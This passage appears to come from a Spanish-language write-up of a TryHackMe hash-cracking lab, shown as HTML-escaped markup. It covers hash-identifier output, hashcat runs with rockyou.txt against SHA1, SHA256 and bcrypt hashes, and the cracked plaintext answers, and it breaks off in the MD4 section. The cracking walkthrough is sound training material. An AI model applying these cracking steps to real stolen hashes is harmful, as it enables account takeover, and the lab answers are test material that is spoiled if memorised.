&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.substr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;,0,3&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtolower&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat-1&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; hash.txt rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;crackstation-1&#34;&gt;Crackstation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2021.58.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;password123:CBFDAC6008F9CAB4083784CBD1874F76618D2A97&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-sha256&#34;&gt;#3 SHA256&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashidentifier-2&#34;&gt;HASHIDENTIFIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; HASH: 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-256

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  GOST R 34.11-94
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-256
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-256
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-256&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat-2&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;1400&lt;/span&gt; hash.txt rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;crackstation-2&#34;&gt;CrackStation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2021.58.44.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;letmein:1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-bcrypt&#34;&gt;#4 BCRYPT&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;hash-analyzer&#34;&gt;Hash-Analyzer&lt;/h4&gt;
&lt;p&gt;Identificamos este hash con la pagina &lt;a href=&#34;https://www.tunnelsup.com/hash-analyzer/&#34;&gt;&lt;strong&gt;Tunnelsup&lt;/strong&gt;&lt;/a&gt; y Utilizamos hashcat para poder desencriptar el hash el cual tomo mucho tiempo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2015.47.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashcat-3&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;3200&lt;/span&gt; hash.txt ../rockyou.txt
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#1: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;72&lt;/span&gt;

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;

Cracking performance lower than expected?        

* Append -w &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; to the commandline.
  This can cause your screen to lag.

* Update your OpenCL runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;tatus &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ause &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ypass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;heckpoint &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;q&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; s

Session..........: hashcat
Status...........: Running
Hash.Type........: bcrypt &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;*$, Blowfish &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Unix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Hash.Target......: &lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;y&lt;span class=&#34;nv&#34;&gt;$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX&lt;/span&gt;...8wsRom
Time.Started.....: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 15:31:19 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; mins, &lt;span class=&#34;m&#34;&gt;43&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Tue Oct  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 02:23:53 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; days, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; hours&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;../rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:        &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; H/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4.21ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:4 Loops:1 Thr:8 Vec:1
Recovered........: 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 0/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 3264/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.02%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/3264 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 3264/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.02%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:916-917
Candidates.#1....: alucard -&amp;gt; hottie101
Hardware.Mon.#1..: Temp: 71c Util: 92% Core:1189MHz Mem:2505MHz Bus:4

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;tatus &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ause &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ypass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;heckpoint &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;q&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; s
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;bleh:$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;5-md4&#34;&gt;#5 MD4&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;279412f945939ba78ce0758d3fd83daa&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashidentifier-3&#34;&gt;HASHIDENTIFIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
